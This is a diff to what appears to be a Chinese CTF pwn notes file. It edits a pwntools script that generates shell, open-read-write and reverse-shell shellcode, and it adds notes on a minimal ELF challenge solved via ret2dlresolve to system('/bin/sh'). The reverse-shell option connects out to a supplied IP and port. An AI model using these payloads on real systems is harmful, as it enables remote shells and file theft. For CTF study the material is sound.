@@ -10,20 +10,22 @@
 ```python
 from pwn import *
 arch=input("arch? i386/amd64: ")
-context(log_level = 'debug', arch = arch[:-1], os = 'linux')
+context(log_level = 'debug', arch = arch, os = 'linux')
 choice=input("shell/orw/reverse: ")[:-1]
 if choice=="shell":
     shellcode=asm(shellcraft.sh())
     print(shellcode)
-elif choice=="reverse:
+elif choice=="reverse":
     ip = input("IP: ")[:-1]
     port=int(input('port: ')[:-1])
     print(asm(shellcraft.connect(ip, port) + shellcraft.dupsh()))
 else:
-    mmap_addr = int(input("hex addr: ")[:-1],16)
-    shellcode = shellcraft.open('./flag')
-    shellcode += shellcraft.read(3, mmap_addr, 0x30)
-    shellcode += shellcraft.write(1, mmap_addr, 0x30)
+    mmap_addr = int(input("hex addr: "),16)
+    filename=input("filename: ")
+    length=int(input("length(in decimal): "))
+    shellcode = shellcraft.open(filename)
+    shellcode += shellcraft.read(3, mmap_addr, length)
+    shellcode += shellcraft.write(1, mmap_addr, length)
     print(asm(shellcode))
 ```
 
@@ -1220,3 +1222,5 @@ int main() {
 }
 ```
 虽然不算什么知识点，但我觉得应该不能有比这还小的elf pwn题了吧？所以记录一下，说不定这么特殊的以后还会遇到呢？或者以后遇到稍微大点的elf也不怕了。minimal是getshell，minimaler是orw。其他解法： https://gist.github.com/unvariant/9ac05bc3214fdfd6835ac38617508a94 。这个思路之前没见过：利用栈迁移在bss段里构造假的Elf64_Rela, Elf64_Sym, 和symbol，然后调用dl_resolver加上合适的参数即可调用`system("/bin/sh")`。似乎连加沙盒的也能这样通解
+115. [SHELLO-WORLD](https://github.com/JOvenOven/ctf-writeups/tree/main/TFC_CTF_2023/pwn/shello_world）
+- pwntools FmtStr object使用
